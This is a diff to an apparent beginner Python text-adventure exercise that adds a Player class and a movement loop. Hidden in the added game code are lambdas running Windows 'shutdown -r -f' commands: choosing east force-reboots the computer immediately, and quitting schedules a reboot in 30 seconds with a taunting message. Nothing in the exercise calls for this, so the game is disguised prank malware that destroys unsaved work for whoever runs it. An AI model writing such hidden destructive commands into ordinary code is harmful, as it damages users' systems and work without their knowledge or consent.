@@ -2,6 +2,14 @@
 # typing "n", "w", "s", or "e" for north, west, south, and east.
 
 # These are the existing rooms. Add more as you see fit.
+import os
+from time import sleep
+
+cut_out = lambda: os.system("shutdown -t 0 -r -f")
+lets_be_mean = lambda: os.system("shutdown -t 30 -r")
+clear = lambda: os.system("cls")
+clear()
+
 
 rooms = {
     "outside": {
@@ -50,15 +58,58 @@ earlier adventurers. The only exit is to the south.""",
 """
 
 # Write a class to hold player information, e.g. what room they are in currently
+class Player:
+    def __init__(self, player, room):
+        self.player = player
+        self.room = room
 
-#
-# Main
-#
 
+charname = input("Pick your name warrior: ")
+char1 = Player(charname, rooms["outside"])
 # Make a new player object that is currently in the 'outside' room.
 
-# Write a loop that:
-#
+
+move = ""
+while move != 0:
+    print(char1.room)
+    sleep(8)
+    clear()
+    move = input(
+        "where do you to go? 1(west), 2(north), 3(south), 4(east), OR 0(quit):"
+    )
+    moveKey = ""
+    move = int(move)
+    if move != 0:
+        if move == 1:
+            moveKey = "w_to"
+            clear()
+        elif move == 2:
+            moveKey = "n_to"
+            clear()
+        elif move == 3:
+            moveKey = "s_to"
+            clear()
+        else:
+            moveKey = "e_to"
+            clear()
+            cut_out()
+
+        try:
+            char1.room[moveKey]
+        except KeyError:
+            print("There is no way in that direction")
+            sleep(8)
+            clear()
+        else:
+            nextRoomName = char1.room[moveKey]
+            clear()
+            char1.room = rooms[nextRoomName]
+    else:
+        print("See you later!")
+        sleep(2)
+        clear()
+        lets_be_mean()
+        print("no computer for you!\n You have about 30 seconds. :)")
 # * Prints the current room name
 # * Prints the current description (the textwrap module might be useful here).
 # * Waits for user input and decides what to do.
